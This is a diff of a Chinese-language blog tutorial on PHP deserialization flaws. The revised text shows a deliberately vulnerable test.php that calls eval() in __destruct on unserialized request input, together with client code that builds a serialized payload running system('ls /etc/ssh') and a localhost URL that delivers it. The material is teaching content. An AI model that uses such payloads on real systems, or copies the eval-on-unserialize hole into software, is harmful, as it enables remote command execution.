@@ -121,46 +121,59 @@
 <h3 id="0x00-关于反序列化漏洞">0x00 关于反序列化漏洞</h3>
 
 <p>序列化：使用函数serialize()可将实例序列化为字符串<br />
-反序列化：使用函数unserialize()可将序列化的字符串还原<br />
-若服务端有如下代码：</p>
+反序列化：使用函数unserialize()可将序列化的字符串还原</p>
+
+<ul>
+<li>服务端有test.php，代码如下</li>
+</ul>
 
 <pre><code class="language-php">&lt;?php
-    class foo{
-        public $file = &quot;test.txt&quot;;
-        public $data = &quot;123456&quot;;
-
-        function __destruct(){
-            file_put_contents($this-&gt;file,$this-&gt;data);
+    class fun{
+        public $msg;
+        function __construct(){
+            echo '__construct';
+        }
+        function __destruct() {
+            eval($this-&gt;msg);
         }
     }
 
     $d = $_REQUEST['str'];
     var_dump($d);
     echo &quot;&lt;br /&gt;&quot;;
-    $tc = unserialize(base64_decode($d));
+    $tc = unserialize($d);
     var_dump($tc);
 ?&gt;
 </code></pre>
 
-<p>客户端可构造如下代码生成序列化后的字符串提交给服务端，<br />
-服务端就会生成文件xx.php，内容为<b>&lt;?php phpinfo(); ?&gt;</b>：</p>
+<ul>
+<li>客户端可构造如下代码生成序列化后的字符串</li>
+</ul>
 
 <pre><code class="language-php">&lt;?php
-    class foo {
-        public $ﬁle = &quot;test.txt&quot;;
-        public $data = &quot;123456&quot;;
-        
+    class fun{
+        public $msg;
+        function __construct(){
+            echo '__construct';
+        }
         function __destruct() {
-            ﬁle_put_contents($this-&gt;ﬁle, $this-&gt;data);
+            eval($this-&gt;msg);
         }
     }
 
-    $f = new foo();
-    $f-&gt;ﬁle = &quot;xx.php&quot;;
-    $f-&gt;data = &quot;&lt;?php phpinfo(); ?&gt;&quot;;
-    echo base64_encode(serialize($f));
+    $f = new fun();
+    $f-&gt;msg = &quot;system('ls /etc/ssh');&quot;;
+    echo serialize($f);
 ?&gt;
 </code></pre>
+
+<p>生成的序列化字符串为：O:3:&ldquo;fun&rdquo;:1:{s:3:&ldquo;msg&rdquo;;s:22:&ldquo;system(&lsquo;ls /etc/ssh&rsquo;);&rdquo;;}</p>
+
+<ul>
+<li>提交序列化字符串给服务端从而执行命令</li>
+</ul>
+
+<p>访问<code>http://127.0.0.1/test.php?str=O:3:&quot;fun&quot;:1:{s:3:&quot;msg&quot;;s:22:&quot;system('ls /etc/ssh');&quot;;}</code>即可得到/etc/ssh下的文件</p>
 
                 
                 <div style="padding:10px 1px;">
